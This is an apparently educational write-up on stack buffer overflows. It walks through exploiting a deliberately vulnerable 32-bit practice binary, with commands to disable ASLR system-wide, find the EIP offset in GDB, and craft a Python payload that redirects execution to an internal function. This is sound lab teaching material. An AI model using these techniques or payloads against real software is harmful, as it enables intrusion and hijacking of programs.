## BufferOverflow

A **buffer overflow** occurs when a program writes more data to a buffer (a **memory area**) than it can handle. This can overwrite important data and, in some cases, allow an attacker to **execute malicious code**.

---

### How it happens:

- **Buffer**: A reserved area in memory for storing data.

- **Overflow**: If the program does not check the size of the data, it can overwrite adjacent memory areas.

---

### Consequences:

- Data corruption and program crashes.

- Execution of malicious code if an attacker exploits the vulnerability.

---

### Prevention:

- Validate data sizes.

- Use **safe functions**.

- Implement protections like **ASLR** and **DEP**.

### Introduction to Buffer Overflow: Invoking Functions via Buffer Overflows

> The practice files are available on my GitHub: [**BufferOverflow**](https://github.com/Conper/BufferOverflow).

To begin, we will explore how a **buffer overflow** can be exploited to invoke a specific function within a program. This process involves manipulating memory to redirect the program's execution flow to a desired function.

To practice this **buffer overflow** case, we will use a **C program** called `secret.c` and compile it with the following command:

```bash
gcc -g -fno-stack-protector -z execstack -m32 secret.c -o secret
```

> "If `gcc -g -fno-stack-protector -z execstack -m32 secret.c -o secret` doesnâ€™t work and gives an error about `gets` being implicitly declared, just add this line after your `#include`:  
> `char *gets(char *);`  
> This tells the compiler what `gets` looks like, even if it's not officially declared anymore."

**Address Space Layout Randomization** (**ASLR**) is a security technique that **randomizes memory addresses** to protect against certain attacks. 

To check if **ASLR** is active for our binary `secret`:

```bash
ldd secret
```

![bof1](/images/hacking/bof/bof1.png)

**ASLR** is set to 2 by default. To disable **ASLR** for easier **buffer overflow** exploitation, run:

```bash
sudo sh -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
```
This change will persist until the next reboot.

The binary `secret` prompts for user input with the message "Input your data:". When the input exceeds the expected number of characters, it triggers a **segmentation fault** due to a **buffer overflow**. This occurs because the program doesn't properly handle or validate the input size, causing it to **overwrite adjacent memory areas**.

![bof2](/images/hacking/bof/bof2.png)


To perform the **buffer overflow**, we will use **GDB** with **GEF** (GDB Enhanced Features).
You can find the **GEF** repository at: [**GEF**](https://github.com/hugsy/gef)

To run the binary with **GDB**, use the command:

```bash
gdb ./secret
```

To determine the **offset** (how many A's you need to input to reach and **overwrite** the **EIP**), we will use the command **pattern create**:

```bash
pattern create
```

![bof3](/images/hacking/bof/bof3.png)

**Generate a pattern** of characters that we can use to determine the **offset** when running the program. Instead of using just a series of A's, weâ€™ll run the program with this character pattern.

We would run it with:

```bash
r <<< 'character_pattern'
```
The `<<<` operator is used to provide a string directly as input to a command or program.

Now we can determine how many characters are needed to reach the **EIP** using the following command:

```bash
pattern offset $eip
```

![bof4](/images/hacking/bof/bof4.png)

In this case, the offset is 76, so we can run this command to verify that the characters are correct and that we will **overwrite the EIP** with the value BBBB:

```bash
r <<< $(python3 -c 'print("A"*76 + "B"*4)')
```

The **EIP** (**Extended Instruction Pointer**) is a **CPU register** that tracks the **address of the next instruction** to execute, and in a **buffer overflow** attack, overwriting it allows you to **control the execution flow** by redirecting it to your chosen code or exploit.

![bof5](/images/hacking/bof/bof5.png)

Additionally, the `checksec` command in **GDB** checks security features like `NX (No Execute)` protection, which prevents code from running in certain memory regions. It helps you see which security mechanisms are active for a binary.

![bof6](/images/hacking/bof/bof6.png)

In our case, we want to execute the function named `secret` that is within the binary. To achieve this, weâ€™ll use the command `p secret` to get the address of the `secret` function. We can then overwrite the **EIP** with this address to **redirect execution** to the `secret` function.

```bash
p FUNCTION_NAME
```

![bof7](/images/hacking/bof/bof7.png)

Now, we need to format the address in **little-endian** (e.g., `0x080484b6` as `\xb6\x84\x04\x08`) because systems store multi-byte values in this order, ensuring the function is executed correctly.

In our case it will be: 0x5655619d -> \x9d\x61\x55\x56

We will now create the payload using `sys.stdout.buffer.write()` instead of `print()` because it writes the data as raw bytes, ensuring that each byte is preserved exactly as needed. This is crucial for accurately overwriting the **EIP** with the correct memory address, especially when handling non-printable characters in the exploit.

Next, we'll execute the binary with our crafted payload using the command:

```bash
./secret <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\x9d\x61\x55\x56")')
```

This command runs the `secret` binary while injecting the payload directly, aiming to overwrite the **EIP** with the address of the `secret` function.

![bof8](/images/hacking/bof/bof8.png)

As a result, the function was executed, printing the message "**You have exploited the buffer overflow!**" before the program crashed with a **segmentation fault**.

You can also save the payload in a **Python script** and execute it when running the `secret` binary, simplifying the injection process.

```python3
import sys

secret_func_address = b'\x9d\x61\x55\x56'
payload = b'A' * 76 + secret_func_address

sys.stdout.buffer.write(payload)
```
